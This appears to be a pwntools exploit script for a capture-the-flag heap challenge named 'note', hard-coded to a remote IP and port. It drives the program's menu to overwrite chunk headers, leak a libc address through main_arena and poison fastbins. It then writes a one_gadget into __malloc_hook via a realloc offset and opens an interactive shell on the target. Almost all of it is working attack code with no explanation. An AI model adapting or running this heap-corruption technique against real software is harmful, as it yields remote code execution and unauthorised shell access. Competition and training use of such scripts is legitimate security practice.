#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./note"
libc = context.binary.libc
libc.sym['main_arena'] = 0x3ebc40
libc.sym['one_gadget'] = 0x4f2c5

#  io = process("./note")
io = remote("34.82.101.212", 10001)

def add(size):
    io.sendlineafter(": ", "1")
    io.sendlineafter(": ", str(size))
    
def edit(idx, cont):
    io.sendlineafter(": ", "2")
    io.sendlineafter(": ", str(idx))
    io.sendafter(": ", cont)
    sleep(0.01)

def show(idx):
    io.sendlineafter(": ", "3")
    io.sendlineafter(": ", str(idx))

def copy(src, dst):
    io.sendlineafter(": ", "4")
    io.sendlineafter(": ", str(src))
    io.sendlineafter(": ", str(dst))

def delete(idx):
    io.sendlineafter(": ", "5")
    io.sendlineafter(": ", str(idx))

def DEBUG():
    cmd = '''
    bpie 0xDE8
    bpie 0xE6E
    bpie 0xB08
    c
    '''
    gdb.attach(io, cmd)
    sleep(0.5)

add(0x400)
add(0x20)
add(0x60)
add(0x3f0)

edit(0, '0' * 0x3ff)
edit(2, flat(0x21) * int(0x50 / 0x8))
edit(3, flat(0x21) * int(0x3e0 / 0x8))

copy(0, 1)

edit(1, flat('0' * 0x28, 0x451))
delete(2)

show(1)
libc.address = u64(io.recvuntil("\x7f")[-6: ] + b'\0\0') - libc.sym['main_arena'] - 96
print("libc @ {:#x}".format(libc.address))

add(0x10)
edit(1, flat('0' * 0x28, flat(0x71)))
delete(2)

add(0x10)
edit(1, flat('0' * 0x48, flat(0x71)))
delete(2)

add(0x10)
edit(1, flat('0' * 0x68, flat(0x71)))
delete(2)

add(0x10)
edit(1, flat('0' * 0x88, flat(0x71)))
delete(2)

add(0x10)
edit(1, flat('0' * 0xa8, flat(0x71)))
delete(2)

add(0x10)
edit(1, flat('0' * 0xc8, flat(0x71)))
delete(2)

add(0x10)
edit(1, flat('0' * 0xe8, flat(0x71)))
delete(2)

add(0x68)
delete(2)
edit(1, flat('0' * 0x108, 0x71, libc.sym['__malloc_hook'] - 0x23))


add(0x68)
add(0x68)

edit(4, flat('\0' * 0xb, libc.sym['one_gadget'], libc.sym['__libc_realloc'] + 9))

#  DEBUG()
add(0)

io.interactive()
